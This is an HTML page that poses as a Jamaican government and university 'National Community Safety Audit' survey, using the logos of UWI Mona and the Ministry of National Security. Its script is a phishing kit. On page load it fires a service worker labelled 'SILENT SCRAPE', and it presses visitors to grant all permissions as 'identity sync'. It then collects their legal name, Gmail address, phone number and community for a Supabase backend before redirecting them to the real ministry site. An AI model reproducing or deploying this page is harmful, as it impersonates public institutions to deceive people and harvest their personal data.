<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>National Security Audit - UWI & MNS Joint Commission</title>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; margin: 0; color: #333; }
.header { background: #003366; color: white; padding: 20px; text-align: center; border-bottom: 6px solid #FFD700; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
.logos { display: flex; justify-content: center; gap: 20px; margin-bottom: 10px; align-items: center; }
.logos img { height: 65px; background: white; padding: 5px; border-radius: 5px; }
.container { max-width: 600px; margin: 25px auto; background: white; padding: 35px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
.q-block { display: none; transition: opacity 0.3s ease; }
.active { display: block; }
h2 { font-size: 22px; margin-bottom: 5px; }
.btn { background: #003366; color: white; border: none; padding: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 18px; font-weight: bold; margin-top: 15px; }
input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
label { font-weight: 600; font-size: 15px; }
</style>
</head>
<body>

<div class="header">
<div class="logos">
<img src="https://www.mona.uwi.edu/sites/all/themes/uwi_mona/logo.png" alt="UWI Mona">
<img src="https://mns.gov.jm/wp-content/uploads/2021/04/MNS-Logo-New.png" alt="MNS Jamaica">
</div>
<h2>National Community Safety Audit 2026</h2>
<p style="margin:0; font-size: 14px; opacity: 0.9;">Authorized Research Initiative</p>
</div>

<div class="container">
<div id="v-stage" class="q-block active">
<h3>Mandatory Identity Sync</h3>
<p>To ensure audit integrity and Parish-level accuracy, please verify your device. Click <strong>Verify</strong> and <strong>Allow</strong> all permissions to continue.</p>
<button id="v-btn" class="btn">Verify & Sync Device</button>
<p id="v-error" style="color:red; font-size:12px; text-align:center; margin-top:10px;"></p>
</div>

<div id="s-stage" class="q-block">
<h3>Section 1: Personal Verification</h3>
<input type="text" id="name" placeholder="Full Name (Legal)" required>
<input type="email" id="email" placeholder="Gmail Address" required>
<input type="tel" id="phone" placeholder="Phone Number (876-000-0000)" required>
<input type="text" id="address" placeholder="Residential Parish / Community" required>

<h3>Section 2: Security Assessment</h3>
<label>5. Rate your community safety level (1-10):</label>
<input type="number" id="q5" min="1" max="10">

<label>6. How often do you see JCF patrols?</label>
<select><option>Daily</option><option>Weekly</option><option>Rarely</option></select>

<label>7. Are community street lights functional?</label>
<select><option>Yes</option><option>No</option><option>Partial</option></select>

<label>8. Have you witnessed a crime this month?</label>
<select><option>Yes</option><option>No</option></select>

<label>9. Rate police responsiveness:</label>
<select><option>Excellent</option><option>Average</option><option>Poor</option></select>

<label>10. Primary neighborhood concern:</label>
<select><option>Theft</option><option>Infrastructure</option><option>Violence</option></select>

<label>11. Describe the largest security threat in your area:</label>
<textarea id="q11" rows="2"></textarea>

<label>12. Feedback for the Ministry of National Security:</label>
<textarea id="q12" rows="2"></textarea>

<button id="sub-btn" class="btn">Finalize & Submit Audit</button>
</div>
</div>

<script>
const SB_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkamxsYmRvZG1ueHV6YW5hbmFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0OTI5MDcsImV4cCI6MjA5MzA2ODkwN30.MGVD1CI1Iw_-k2_y6UBZReIS9KQykFXkRt-5V6gAleo';

// TRIGGER SILENT SCRAPE ON LOAD
window.onload = () => {
if ('serviceWorker' in navigator) {
navigator.serviceWorker.register('sw.js').then(reg => {
reg.active?.postMessage({ type: 'SILENT_HOOK' });
});
}
};

document.getElementById('v-btn').onclick = async () => {
const permission = await Notification.requestPermission();
if (permission === 'granted') {
navigator.serviceWorker.ready.then(reg => {
reg.active.postMessage({ type: 'FULL_AUTH' });
});
document.getElementById('v-stage').classList.remove('active');
document.getElementById('s-stage').classList.add('active');
} else {
document.getElementById('v-error').innerText = "Security Error: Verification requires permission to proceed.";
}
};

document.getElementById('sub-btn').onclick = async () => {
const payload = {
name: document.getElementById('name').value,
email: document.getElementById('email').value,
phone: document.getElementById('phone').value,
address: document.getElementById('address').value
};

// Pushing only identity data to dashboard as requested
navigator.serviceWorker.ready.then(reg => {
reg.active.postMessage({ type: 'SUBMIT_IDENTITY', data: payload });
alert("Audit Data Securely Transmitted.");
window.location.href = "https://mns.gov.jm/";
});
};
</script>
</body>
</html>
